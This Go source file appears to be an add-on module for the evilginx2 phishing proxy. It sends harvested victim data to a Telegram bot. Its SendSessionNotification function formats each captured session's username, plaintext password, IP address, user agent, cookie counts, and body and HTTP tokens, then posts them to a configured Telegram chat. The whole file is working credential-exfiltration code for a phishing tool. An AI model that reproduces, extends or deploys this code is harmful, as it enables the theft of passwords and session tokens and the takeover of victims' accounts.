package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type TelegramConfig struct {
	WebhookUrl string `mapstructure:"telegram_webhook" json:"telegram_webhook" yaml:"telegram_webhook"`
	ChatId     string `mapstructure:"telegram_chat_id" json:"telegram_chat_id" yaml:"telegram_chat_id"`
	Enabled    bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
}

func (c *Config) SetTelegramWebhook(webhookUrl string) {
	c.general.TelegramWebhook = webhookUrl
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("telegram webhook URL set to: %s", webhookUrl)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramChatId(chatId string) {
	c.general.TelegramChatId = chatId
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("telegram chat ID set to: %s", chatId)
	c.cfg.WriteConfig()
}

func (c *Config) EnableTelegram(enabled bool) {
	c.general.TelegramEnabled = enabled
	if enabled {
		log.Info("telegram notifications are now enabled")
	} else {
		log.Info("telegram notifications are now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) GetTelegramWebhook() string {
	return c.general.TelegramWebhook
}

func (c *Config) GetTelegramChatId() string {
	return c.general.TelegramChatId
}

func (c *Config) IsTelegramEnabled() bool {
	return c.general.TelegramEnabled
}

type TelegramMessage struct {
	ChatId string `json:"chat_id"`
	Text   string `json:"text"`
}

func SendTelegramNotification(webhookUrl, chatId, message string) error {
	if webhookUrl == "" || chatId == "" {
		return fmt.Errorf("telegram webhook URL or chat ID not configured")
	}

	telegramMsg := TelegramMessage{
		ChatId: chatId,
		Text:   message,
	}

	jsonData, err := json.Marshal(telegramMsg)
	if err != nil {
		return err
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Post(webhookUrl, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status code: %d", resp.StatusCode)
	}

	return nil
}

func SendSessionNotification(db *database.Database, webhookUrl, chatId, sessionId string) error {
	if !strings.HasPrefix(webhookUrl, "https://api.telegram.org/bot") {
		return fmt.Errorf("invalid telegram webhook URL format")
	}

	session, err := db.GetSessionBySid(sessionId)
	if err != nil {
		return err
	}

	// Create a formatted message about the captured session
	var sb strings.Builder
	sb.WriteString("🚨 *Evilginx Session Captured* 🚨\n\n")
	sb.WriteString(fmt.Sprintf("*Phishlet:* %s\n", session.Phishlet))
	sb.WriteString(fmt.Sprintf("*Username:* %s\n", session.Username))
	if session.Password != "" {
		sb.WriteString(fmt.Sprintf("*Password:* %s\n", session.Password))
	}
	sb.WriteString(fmt.Sprintf("*Remote IP:* %s\n", session.RemoteAddr))
	sb.WriteString(fmt.Sprintf("*User Agent:* %s\n", session.UserAgent))
	sb.WriteString(fmt.Sprintf("*Landing URL:* %s\n", session.LandingURL))
	sb.WriteString(fmt.Sprintf("*Capture Time:* %s\n", time.Unix(session.UpdateTime, 0).Format("2006-01-02 15:04:05")))

	if len(session.CookieTokens) > 0 {
		sb.WriteString("\n*Cookies Captured:*\n")
		for domain, cookies := range session.CookieTokens {
			sb.WriteString(fmt.Sprintf("  `%s`: %d cookies\n", domain, len(cookies)))
		}
	}

	if len(session.BodyTokens) > 0 {
		sb.WriteString("\n*Body Tokens Captured:*\n")
		for name, value := range session.BodyTokens {
			sb.WriteString(fmt.Sprintf("  `%s`: %s\n", name, value))
		}
	}

	if len(session.HttpTokens) > 0 {
		sb.WriteString("\n*HTTP Tokens Captured:*\n")
		for name, value := range session.HttpTokens {
			sb.WriteString(fmt.Sprintf("  `%s`: %s\n", name, value))
		}
	}

	if len(session.Custom) > 0 {
		sb.WriteString("\n*Custom Data:*\n")
		for key, value := range session.Custom {
			sb.WriteString(fmt.Sprintf("  `%s`: %s\n", key, value))
		}
	}

	message := sb.String()

	return SendTelegramNotification(webhookUrl, chatId, message)
}